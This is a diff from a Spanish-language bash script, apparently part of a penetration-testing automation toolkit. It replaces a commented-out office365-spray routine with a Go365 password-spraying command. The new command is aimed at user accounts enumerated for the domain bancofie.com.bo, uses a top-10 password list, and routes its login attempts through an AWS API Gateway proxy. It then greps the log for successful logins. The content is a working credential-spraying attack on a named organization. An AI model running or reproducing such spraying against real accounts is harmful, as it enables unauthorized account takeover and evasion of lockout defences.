@@ -263,10 +263,9 @@ fi
 if [ -f .enumeracion2/"$DOMINIO"_office365_users.txt ]
 then		
 	echo -e "[+] Probando Office365 passwords"
-	# office365-spray.sh generate normal -ep `pwd`/office365.plan -d $DOMINIO -u `pwd`/.enumeracion2/"$DOMINIO"_office365_users.txt -pf `pwd`/top10.txt
-	# office365-spray.sh spray -ep `pwd`/office365.plan  | tee -a `pwd`/logs/cracking/correo_office365_passwordAdivinadoUser.txt
-	# grep -i "Authentication Success" logs/cracking/correo_office365_passwordAdivinadoUser.txt | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt
-
+	Go365 -endpoint rst -ul .enumeracion2/bancofie.com.bo_office365_users.txt -pl top10.txt -w 5 -url https://0ph9tvyrja.execute-api.us-east-1.amazonaws.com/post/rst2.srf | tee -a  logs/cracking/correo_office365_passwordAdivinadoUser.txt
+	grep 'valid login' logs/cracking/correo_office365_passwordAdivinadoUser.txt  > .vulnerabilidades/correo_office365_passwordAdivinadoUser.txt	
+	
 	# for password in $(cat top10.txt); do
 	#  	echo -e "\t[+] Probando password $password"				
 	#  	office365_user_enum.py -m login -i .enumeracion2/bancofie.com.bo_office365_users.txt -p $password >> logs/cracking/correo_office365_passwordAdivinadoUser.txt 2>/dev/null
